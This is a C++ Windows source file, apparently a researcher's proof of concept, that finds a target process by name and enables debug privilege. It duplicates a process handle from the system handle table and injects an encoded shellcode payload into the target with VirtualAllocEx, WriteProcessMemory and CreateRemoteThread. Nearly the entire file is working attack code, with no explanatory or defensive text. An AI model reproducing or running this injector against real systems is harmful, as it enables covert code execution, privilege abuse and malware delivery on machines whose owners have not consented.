/*

Researcher & developer: Mehrshad Mollaafzal
Github: "https://github.com/mehrshadmollaafzal"
Twitter: "https://x.com/Mehrshad_13_"
Linkedin: "https://www.linkedin.com/in/mehrshad-mollaafzal/"

*/

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

typedef NTSTATUS(WINAPI* fNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    BOOL success = FALSE;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
                success = TRUE;
            }
        }
        CloseHandle(hToken);
    }

    return success;
}

HANDLE getHandle(DWORD processID, PVOID address)
{
    ULONG returnLenght = 0;
    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation)
    {
        PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
        if (handleTableInformation)
        {
            NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);

            for (int i = 0; i < handleTableInformation->NumberOfHandles; i++)
            {
                SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = handleTableInformation->Handles[i];
                if (handleInfo.UniqueProcessId == processID) // PID of notepad.exe
                {
                    if (handleInfo.Object == address) // address of handle from procexp64
                    {
                        HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, processID);
                        if (hProcess != NULL)
                        {
                            HANDLE hDupHandle = NULL;
                            if (DuplicateHandle(hProcess, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &hDupHandle, PROCESS_QUERY_INFORMATION, FALSE, DUPLICATE_SAME_ACCESS))
                            {
                                // Print information about the duplicated handle
                                printf("Duplicated handle: 0x%p\n", hDupHandle);
                                // CloseHandle(hProcess);
                                return hDupHandle;
                            }
                            else
                            {
                                printf("Error DuplicateHandle: %d\n", GetLastError());
                            }
                            CloseHandle(hProcess);
                        }
                        else
                        {
                            printf("Error OpenProcess: %d\n", GetLastError());
                        }
                    }
                }
            }
            HeapFree(GetProcessHeap(), 0, handleTableInformation);
        }
    }
    return 0;
}

DWORD GetPIDByName(const std::wstring& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("Error CreateToolhelp32Snapshot: %d\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        printf("Error Process32First: %d\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (processName == pe32.szExeFile) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    printf("Process not found\n");
    CloseHandle(hSnapshot);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::wcout << L"Usage: " << argv[0] << L" <address> <process name>" << std::endl;
        return 1;
    }

    unsigned long long address = std::stoull(argv[1], nullptr, 16);
    std::wstring processName = std::wstring(argv[2], argv[2] + strlen(argv[2]));

    if (EnableDebugPrivilege()) {
        printf("[+] SeDebugPrivilege enabled successfully.\n");
    }
    else {
        printf("[-] Error EnableDebugPrivilege: %d\n", GetLastError());
    }

    DWORD pid = GetPIDByName(processName);

    if (pid != 0) {
        printf("[+] PID of %ws is %d\n", processName, pid);
    }
    else {
        printf("[-] Error EnableDebugPrivilege: %d\n", GetLastError());
        return 1;
    }

    HANDLE hProcess = getHandle(pid, (PVOID)address);
    if (hProcess == NULL) {
        printf("[-] Error getHandle: %d\n", GetLastError());
        return 1;
    }

    unsigned char shellcode[] =
        "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
        "\xff\xff\xff\x48\xbb\x89\x8f\xaf\xf0\xb8\xee\x18\xeb\x48"
        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x75\xc7\x2c"
        "\x14\x48\x06\xd8\xeb\x89\x8f\xee\xa1\xf9\xbe\x4a\xba\xdf"
        "\xc7\x9e\x22\xdd\xa6\x93\xb9\xe9\xc7\x24\xa2\xa0\xa6\x93"
        "\xb9\xa9\xc7\x24\x82\xe8\xa6\x17\x5c\xc3\xc5\xe2\xc1\x71"
        "\xa6\x29\x2b\x25\xb3\xce\x8c\xba\xc2\x38\xaa\x48\x46\xa2"
        "\xb1\xb9\x2f\xfa\x06\xdb\xce\xfe\xb8\x33\xbc\x38\x60\xcb"
        "\xb3\xe7\xf1\x68\x65\x98\x63\x89\x8f\xaf\xb8\x3d\x2e\x6c"
        "\x8c\xc1\x8e\x7f\xa0\x33\xa6\x00\xaf\x02\xcf\x8f\xb9\xb9"
        "\x3e\xfb\xbd\xc1\x70\x66\xb1\x33\xda\x90\xa3\x88\x59\xe2"
        "\xc1\x71\xa6\x29\x2b\x25\xce\x6e\x39\xb5\xaf\x19\x2a\xb1"
        "\x6f\xda\x01\xf4\xed\x54\xcf\x81\xca\x96\x21\xcd\x36\x40"
        "\xaf\x02\xcf\x8b\xb9\xb9\x3e\x7e\xaa\x02\x83\xe7\xb4\x33"
        "\xae\x04\xa2\x88\x5f\xee\x7b\xbc\x66\x50\xea\x59\xce\xf7"
        "\xb1\xe0\xb0\x41\xb1\xc8\xd7\xee\xa9\xf9\xb4\x50\x68\x65"
        "\xaf\xee\xa2\x47\x0e\x40\xaa\xd0\xd5\xe7\x7b\xaa\x07\x4f"
        "\x14\x76\x70\xf2\xb9\x06\x99\x6b\xd9\xd6\xbc\x9d\xf0\xb8"
        "\xaf\x4e\xa2\x00\x69\xe7\x71\x54\x4e\x19\xeb\x89\xc6\x26"
        "\x15\xf1\x52\x1a\xeb\x88\x34\x6f\x58\x95\x7a\x59\xbf\xc0"
        "\x06\x4b\xbc\x31\x1f\x59\x51\xc5\xf8\x89\xf7\x47\x3b\x54"
        "\x62\x63\xe7\xae\xf1\xb8\xee\x41\xaa\x33\xa6\x2f\x9b\xb8"
        "\x11\xcd\xbb\xd9\xc2\x9e\x39\xf5\xdf\xd8\xa3\x76\x4f\xe7"
        "\x79\x7a\xa6\xe7\x2b\xc1\x06\x6e\xb1\x02\x04\x17\x34\x69"
        "\x70\x7a\xb8\x31\x29\x72\xfb\xc8\xd7\xe3\x79\x5a\xa6\x91"
        "\x12\xc8\x35\x36\x55\xcc\x8f\xe7\x3e\xc1\x0e\x6b\xb0\xba"
        "\xee\x18\xa2\x31\xec\xc2\x94\xb8\xee\x18\xeb\x89\xce\xff"
        "\xb1\xe8\xa6\x91\x09\xde\xd8\xf8\xbd\x89\x2e\x72\xe6\xd0"
        "\xce\xff\x12\x44\x88\xdf\xaf\xad\xdb\xae\xf1\xf0\x63\x5c"
        "\xcf\x91\x49\xaf\x98\xf0\x67\xfe\xbd\xd9\xce\xff\xb1\xe8"
        "\xaf\x48\xa2\x76\x4f\xee\xa0\xf1\x11\xd0\xa6\x00\x4e\xe3"
        "\x79\x79\xaf\xa2\x92\x45\xb0\x29\x0f\x6d\xa6\x29\x39\xc1"
        "\x70\x65\x7b\xb6\xaf\xa2\xe3\x0e\x92\xcf\x0f\x6d\x55\xe8"
        "\x5e\x2b\xd9\xee\x4a\x1e\x7b\xa5\x76\x76\x5a\xe7\x73\x7c"
        "\xc6\x24\xed\xf5\x85\x2f\x0b\x58\x9b\x1d\x50\xce\x9c\xdd"
        "\x9f\xd2\xee\x41\xaa\x00\x55\x50\x25\xb8\xee\x18\xeb";


    PVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("Error VirtualAllocEx: %d\n", GetLastError());
        Sleep(INFINITE);
        return 1;
    }

    if (WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof shellcode, NULL)) {

        HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
        if (remoteThread == NULL) {
            printf("Error CreateRemoteThread: %d\n", GetLastError());
            return 1;
        }
        CloseHandle(hProcess);
    }
    else
    {
        printf("Error WriteProcessMemory: %d\n", GetLastError());
        return 1;
    }

    return 0;
}
